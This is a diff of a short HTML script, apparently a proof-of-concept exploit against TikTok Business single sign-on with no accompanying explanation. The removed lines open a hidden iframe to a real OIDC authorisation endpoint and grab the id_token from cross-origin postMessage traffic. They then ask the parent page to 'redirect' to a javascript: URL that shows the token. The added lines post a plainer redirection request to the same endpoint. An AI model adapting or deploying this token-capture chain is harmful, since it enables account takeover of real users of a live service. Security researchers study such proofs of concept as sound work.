@@ -1,21 +1,6 @@
 <script>
-document.addEventListener("DOMContentLoaded", function() {
-    var iframe = document.createElement('iframe');
-    iframe.style.display = 'none';
-    iframe.src = 'https://business-sso.tiktok.com/oidc/web_auth/?aid=1583&client_id=fae9da30-e377-406a-941d-3ceea97626f4&nonce=xyz&redirect_uri=https://business-suite.tiktokw.eu/message/auth&response_type=id_token&scope=user_id&state=xyz';
-    document.body.appendChild(iframe);
-
-    window.addEventListener("message", function(e) {
-        if (e.origin.includes("tiktokw.eu") && typeof e.data === 'string' && e.data.includes("id_token=")) {
-            var tokenMatch = e.data.match(/id_token=([^&]+)/);
-            if (tokenMatch) {
-                var token = tokenMatch[1];
-                parent.postMessage({
-                    action: "requestRedirectionTo",
-                    targetUrlStr: "javascript:alert('Magic token is = " + decodeURIComponent(token) + "')"
-                }, "*");
-            }
-        }
-    }, false);
-});
+parent.postMessage({
+    action: "requestRedirectionTo",
+    targetUrlStr: "https://business-sso.tiktok.com/oidc/web_auth/?aid=1583&client_id=fae9da30-e377-406a-941d-3ceea97626f4&nonce=xyz&redirect_uri=https://business-suite.tiktokw.eu/message/auth&response_type=id_token&scope=user_id&state=xyz"
+}, "*");
 </script>
